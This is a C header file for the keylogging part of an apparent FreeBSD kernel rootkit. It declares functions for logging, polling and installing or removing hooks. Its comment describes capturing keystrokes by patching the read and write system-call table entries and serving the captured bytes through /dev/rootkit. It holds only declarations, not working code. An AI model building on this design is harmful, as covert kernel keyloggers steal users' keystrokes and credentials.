#ifndef RK_LOG_H
#define RK_LOG_H

#include <sys/types.h>

struct thread;

/*
 * Kernel half of the keylogging feature (see log.c for the design).
 *
 *   capture  - sysent[SYS_read]/[SYS_write] patched, bytes land in a ring
 *   delivery - interface.c exposes the ring as read()/poll() on /dev/rootkit
 */
void	rk_log_init(void);
void	rk_log_uninit(void);

void	rk_log_write(const void *data, size_t len);
void	rk_log_printf(const char *fmt, ...) __printflike(1, 2);

size_t	rk_log_read(void *dst, size_t len);
int	rk_log_poll_ready(struct thread *td);

int	rk_log_hook_install(void);
void	rk_log_hook_remove(void);

void	rk_line_flush(void);

#endif /* RK_LOG_H */
